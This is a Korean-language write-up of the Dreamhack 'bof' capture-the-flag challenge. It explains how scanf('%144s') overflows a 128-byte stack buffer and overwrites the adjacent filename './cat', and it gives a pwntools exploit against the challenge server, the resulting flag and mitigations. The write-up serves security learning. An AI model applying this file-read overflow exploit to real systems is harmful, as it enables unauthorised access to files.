# Dreamhack bof 문제 풀이

> 분류: Pwnable / Stack Buffer Overflow (인접 변수 덮어쓰기)
> 환경: 64비트 ELF (x86-64), `scanf("%144s")` 오버플로우
> 목표: 버퍼 오버플로우로 명령/파일명 변수를 덮어 `./cat` 대신 `/home/bof/flag`를 열게 만들어 flag 읽기
> flag 경로: `/home/bof/flag`

---

## 0. 환경 세팅 (WSL)

```bash
# Ubuntu 진입 (docker-desktop 아님에 주의)
wsl -d Ubuntu

# 가상환경에 pwntools 설치 (externally-managed 에러 회피)
sudo apt install -y python3-venv python3-full
python3 -m venv ~/pwn
source ~/pwn/bin/activate
pip install pwntools
```

## 1. 문제 개요

접속하면 `meow?` 프롬프트가 뜨고, 입력한 문자열을 고양이 그림과 함께 되돌려준다.

```
meow?
 /\_/\   meow~
( o.o )
 > ^ <
meow, (입력값) :)
```

바이너리 `bof`를 디컴파일해 보면 입력 버퍼 뒤에 내부 명령/파일명 문자열이 있어, 버퍼 오버플로우로 이를 덮을 수 있는 구조다.

> > "실행하면 meow? 하고 물어보고, 입력을 받으면 고양이 그림이랑 같이 입력값을 되돌려 주는 구조이다.
> > 내부적으로는 ./cat이라는 파일을 열어서 그 내용을 출력하는 프로그램인 것을 확인했다."

---

## 2. 프로그램 분석

`bof`는 소스 코드(.c)가 없는 실행 파일이기 때문에 디컴파일을 통해 이 프로그램이 내부에서 뭘 하는지를 알아냈다.

`bof` 디컴파일 결과:

```c
int main() {
    char v4[128];   // 사용자 입력 버퍼          [rbp-0x90]
    char v5[16];    // "./cat" 명령/파일명 저장   [rbp-0x10]
    init();

    v5 = "./cat";                  // 내부에서 열 파일 경로 하드코딩
    printf("meow? ");
    __isoc99_scanf("%144s", v4);   // v4에 입력 (최대 144바이트 → 취약점)

    read_cat(v5);                  // v5 경로를 open()해서 내용 출력
    printf("meow, %s :)", v4);     // 입력값 echo
}
```

`read_cat(path)`는 전달받은 경로를 `open()`하고, 성공 시 `read` → `puts`로 **파일 내용을 그대로 출력**한다. 정상 실행에서는 `v5 = "./cat"`이라 cat 파일만 읽힌다.

> > 디컴파일해보니 입력 버퍼 v4는 128바이트인데, scanf("%144s")로 144바이트까지 받음.
> > 버퍼 오버플로우 발생!!

---

## 3. 취약점 분석

```asm
4013e7:  call __isoc99_scanf        ; scanf("%144s", v4)
```

- `v4`의 크기는 **128바이트**인데 `scanf("%144s")`는 **최대 144바이트**를 읽는다.
- 128바이트를 넘는 입력은 `v4` 바로 뒤의 `v5`(명령/파일명 버퍼)를 덮어쓴다.

```
v4 = [rbp-0x90]
v5 = [rbp-0x10]
거리 = 0x90 - 0x10 = 0x80 = 128 바이트
```

즉 `v4`를 128바이트 채운 뒤 이어서 쓰는 값이 `v5`("./cat")를 덮는다.

> > 버퍼 오버플로우가 발생해 128바이트를 넘는 입력은 `v4` 바로 뒤의 `v5`를 덮어쓰게 된다.
> > v5라는 변수에는 ./cat이 저장되어있다.
> > 버퍼가 넘치면 이 파일 이름을 덮어쓸 수 있다는 것이 취약점.

```
[ v4: 입력 128바이트 ][ v5: "./cat" ]
   여기 채우고         ← 여기를 덮는다
```

---

## 4. 공격 원리

실행 순서가 `scanf(v4)` → `read_cat(v5)`이므로:

1. `scanf`에 128바이트 더미 + `/home/bof/flag`를 입력한다.
2. 더미 128바이트가 `v4`를 채우고, `/home/bof/flag`가 `v5`("./cat")를 덮는다.
3. 이어 호출되는 `read_cat(v5)`가 이제 `/home/bof/flag`를 `open()`한다.
4. flag 파일 내용이 `puts`로 출력된다.

`scanf("%s")`가 입력 끝에 자동으로 널 문자(`\0`)를 붙여주므로, `v5`는 정확히 `"/home/bof/flag\0"`가 되어 원하는 파일만 열린다.

> > 그래서 128바이트는 아무 더미데이터(A)으로 채우고, 그 뒤에 진짜 flag 경로 /home/bof/flag를 넣으면, ./cat 대신 flag 파일을 열게 된다.
> > 그럼 프로그램이 알아서 flag를 출력해줌.

> > payload = b"A"\*128 + b"/home/bof/flag"

---

## 5. 스택 구조

```
낮은 주소
┌──────────────────────────────┐
│ v4[128]       [rbp-0x90]      │  ← scanf 입력 시작
│   ...(128바이트)               │
├──────────────────────────────┤
│ v5[16]        [rbp-0x10]      │  ← "./cat" → "/home/bof/flag"로 덮을 대상
├──────────────────────────────┤
│ saved rbp / return addr       │
└──────────────────────────────┘
높은 주소
```

---

## 6. 익스플로잇 (exploit.py)

```python
from pwn import *

context(arch="amd64", os="linux")

# 원격 서버 접속
p = remote("host3.dreamhack.games", 17663)
# 로컬 테스트: p = process("./bof")

payload  = b"A" * 0x80              # v4 버퍼 128바이트 채우기
payload += b"/home/bof/flag"        # v5("./cat")를 진짜 flag 경로로 덮기

p.sendline(payload)
p.interactive()
```

---

## 7. 실행 결과

```
[+] Opening connection to host3.dreamhack.games on port 17663: Done
[*] Switching to interactive mode
meow?
DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}

meow, AAAA...AAAA/home/bof/flag :)
```

> > 실제로 서버에 보냈더니 flag가 나왔다. 리턴 주소를 조작한 게 아니라, 프로그램이 열 파일 이름을 바꿔치기해서 원하는 파일을 읽어낸 공격.

**획득한 flag:**
![alt text](image.png)

```
DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}
```

![alt text](image-1.png)

> > 보통 버퍼 오버플로우는 리턴 주소를 덮어 코드 실행을 뺏지만, 이 문제는 프로그램이 '열 파일 이름'을 바꿔치기해서 원하는 파일을 읽어낸 게 포인트인 문제였다.

---

## 8. 요약

> `scanf("%144s")`가 128바이트 버퍼 `v4`에 최대 144바이트를 받아 오버플로우가 발생하고,
> 넘친 입력이 **바로 뒤의 파일명 변수(`./cat`)를 `/home/bof/flag`로 덮어쓴다.**
> 이어 호출되는 `read_cat`이 flag 파일을 열게 되어 **임의 파일 읽기(Arbitrary File Read)** 로 flag가 노출된다.
> 리턴 주소가 아니라 **인접 지역 변수를 덮는** 형태의 스택 버퍼 오버플로우다.

---

## 9. 대응 방안

- `scanf("%144s")`처럼 버퍼 크기를 초과하는 포맷 지정을 쓰지 말고, 버퍼 크기에 맞게(`%127s`) 또는 `fgets(buf, sizeof(buf), stdin)` 사용.
- 파일명처럼 신뢰 경계가 중요한 값은 입력 버퍼와 **분리된 영역**에 두기.
- 컴파일 옵션: `-fstack-protector`(카나리), `-D_FORTIFY_SOURCE=2`.

---

## 10. 배운 점

- 디스어셈블(objdump) / 디컴파일(IDA)로 알 수 없는 바이너리를 고급 언어 수준에서 이해할 수 있다.
- 버퍼 오버플로우는 리턴 주소 탈취뿐 아니라, **인접 변수를 조작해 프로그램 로직을 바꾸는** 형태로도 악용된다.
- 입력 길이 제한(포맷 지정자, 안전한 함수)의 중요성.
